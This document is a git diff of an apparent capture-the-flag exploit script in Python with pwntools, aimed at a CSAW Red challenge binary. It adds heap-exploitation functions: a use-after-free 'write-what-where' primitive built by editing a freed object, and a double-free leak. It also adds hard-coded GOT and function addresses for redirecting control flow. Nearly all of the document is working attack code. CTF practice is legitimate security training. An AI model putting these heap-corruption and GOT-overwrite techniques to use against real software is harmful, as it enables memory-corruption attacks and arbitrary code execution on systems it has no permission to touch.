@@ -74,7 +74,7 @@ def edit(index, newname_or_newbarcode, newage):
     print(str(newage).encode()+b'\n')
     conn.sendline(str(newage).encode())
 
-def display(index):
+def show(index):
     print(conn.recvuntil(b'> ').decode())
     print(b'3\n')
     conn.sendline(b'3')
@@ -100,18 +100,44 @@ elif args.LOCAL:
     conn = process('./worstcodeever')
 else:
     conn = remote('pwn.red.csaw.io',5008)
-    
-addfriend(b'11',b'freddy',123)
-addrobot(1234567,80)
-display(0)
-display(1)
-edit(1, 987654, 90)
-display(1)
-edit(0, b'mercury', 321)
-display(0)
-free(1)
-display(1)
 
+def testwrappers():    
+    addfriend(b'11',b'freddy',123)
+    addrobot(1234567,80)
+    show(0)
+    show(1)
+    edit(1, 987654, 90)
+    show(1)
+    edit(0, b'mercury', 321)
+    show(0)
+    free(1)
+    show(1)
+  
+def writewhatwhere(where, what):
+    addrobot(999,100) #create an unwanted robot (to avoid "too few friends")
+    addrobot(101,200) #create a robot
+    free(1)           #free the robot
+    edit(1,where,300) #edit the robot, setting barcode to `where`
+    addrobot(888,400) #create another unwanted robot
+    addrobot(what,500)#create another robot; it will be at `where`; set its barcode to `what`
+    #you have written `what` to `where`
+
+def leak():
+    addrobot(999,100)#create an unwanted robot (to avoid "too few friends")
+    addrobot(101,200)#create a robot
+    show(1)
+    free(1) #double free the robot
+    free(1)
+    show(1)
+    
+puts_gotplt = 0x00602020
+play = 0x00400db8
+
+leak()
+#writewhatwhere(puts_gotplt,play)
 conn.interactive()
 
 conn.close()
+
+
+
